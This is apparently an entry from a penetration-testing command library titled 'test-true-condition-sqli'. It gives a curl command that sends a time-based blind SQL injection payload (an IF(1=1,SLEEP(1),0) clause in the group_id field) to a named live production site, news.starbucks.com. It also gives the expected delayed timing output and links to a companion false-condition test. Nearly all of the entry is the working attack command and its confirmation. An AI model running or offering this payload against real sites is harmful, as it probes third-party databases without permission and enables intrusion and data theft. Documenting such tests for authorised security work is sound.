---
id: cmd-uuid-002
data: >-
  time curl --data
  "ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND
  group_id='1" https://news.starbucks.com
tags:
  - blind-sqli
  - timing-attack
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.250Z'
verified: false
validated: true
submitted: true
---
# test-true-condition-sqli

## Command

```bash
time curl --data "ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1" https://news.starbucks.com
```

## Description

Tests time-based SQLi with a true condition (1=1) to trigger SLEEP(1) delay.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `time` | Measures execution time | Yes |
| `--data` | POST data with payload | Yes |
| `ACT=55` | Action param | Yes |
| `jsontree={\"x\":1}` | JSON param | Yes |
| `site_id=1` | Site ID | Yes |
| `group_id=...` | SQL payload | Yes |
| URL | Target | Yes |

## Examples

### Basic Usage

```bash
time curl --data "ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1" https://news.starbucks.com
```

## Expected Output

real 0m4.945s
user 0m0.000s
sys 0m0.063s (delay from SLEEP)

## Related

- [[commands/test-false-condition-sqli]]
